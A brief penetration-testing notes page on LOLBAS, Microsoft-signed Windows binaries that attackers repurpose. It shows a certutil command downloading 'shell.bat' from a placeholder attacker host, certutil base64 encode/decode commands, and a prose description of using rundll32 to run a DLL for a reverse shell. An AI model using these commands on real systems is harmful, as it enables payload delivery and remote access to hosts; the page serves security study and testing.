---
title: Windows binaries -  LOLBAS
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege escalation
  - windows
---

# Windows binaries -  LOLBAS 

Equivalent to [suid binaries from linux](suid-binaries.md) in Windows would be: [LOLBAS: https://lolbas-project.github.io/](https://lolbas-project.github.io/) (Living Off The Land Binaries, Scripts and Libraries),

 Each of these binaries, scripts and libraries is a Microsoft-signed file that is either native to the operating system or can be downloaded directly from Microsoft and have unexpected functionality useful to an attacker.

## Transferring File with Certutil

One classic example is [certutil.exe](certutil.md), whose intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

Import a file (type from your windows target host):

```powershell
certutil.exe -urlcache -split -f http://$ipAtacker:8080/shell.bat shell.bat
```

Encode to base64:

```cmd
certutil -encode file1 encodedfile
```

Decode a file:

```cmd
certutil -decode encodedfile file2
```


## Execute a DLL file with rundll32.exe

A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file. 

We could use this to obtain a reverse shell by executing a .DLL file that we either download onto the remote host or host ourselves on an SMB share.

